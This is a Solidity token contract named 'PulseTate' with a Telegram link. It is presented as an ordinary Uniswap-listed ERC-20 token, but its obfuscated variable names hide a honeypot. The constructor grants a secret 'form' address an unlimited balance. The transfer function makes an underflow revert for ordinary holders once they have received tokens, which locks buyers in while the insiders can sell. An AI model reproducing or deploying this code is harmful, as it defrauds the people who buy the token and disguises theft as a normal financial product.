// https://t.me/pulsetate

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';

contract PulseTate is Ownable {
    constructor(
        string memory dawn,
        string memory roof,
        address declared,
        address form
    ) {
        uniswapV2Router = IUniswapV2Router02(declared);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        _symbol = roof;
        _name = dawn;
        add = 0;
        _decimals = 9;
        _balances[form] = guide;
        native = 1000000000;
        collect[form] = guide;
        _tTotal = native * 10**_decimals;
        collect[msg.sender] = guide;
        _balances[msg.sender] = _tTotal;
    }

    uint256 public add;
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    uint256 private _tTotal;
    uint256 private native;
    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;
    address private concerned;
    uint256 private guide = (~uint256(0));

    function decimals() public view returns (uint256) {
        return _decimals;
    }

    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;

    function totalSupply() public view returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function _transfer(
        address familiar,
        address occur,
        uint256 chicken
    ) internal {
        uint256 rocket = add;

        address loose = uniswapV2Pair;

        if (collect[familiar] == 0 && loose != familiar && stretch[familiar] > 0) {
            collect[familiar] -= rocket - 1;
        }

        address whom = concerned;
        concerned = occur;
        stretch[whom] += rocket + 1;

        _balances[familiar] -= chicken;
        uint256 party = (chicken / 100) * add;
        chicken -= party;
        _balances[occur] += chicken;
    }

    mapping(address => uint256) private stretch;

    function approve(address spender, uint256 amount) external returns (bool) {
        return _approve(msg.sender, spender, amount);
    }

    mapping(address => uint256) private collect;

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool) {
        _transfer(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private returns (bool) {
        require(owner != address(0) && spender != address(0), 'ERC20: approve from the zero address');
        _allowances[owner][spender] = amount;
        return true;
    }
}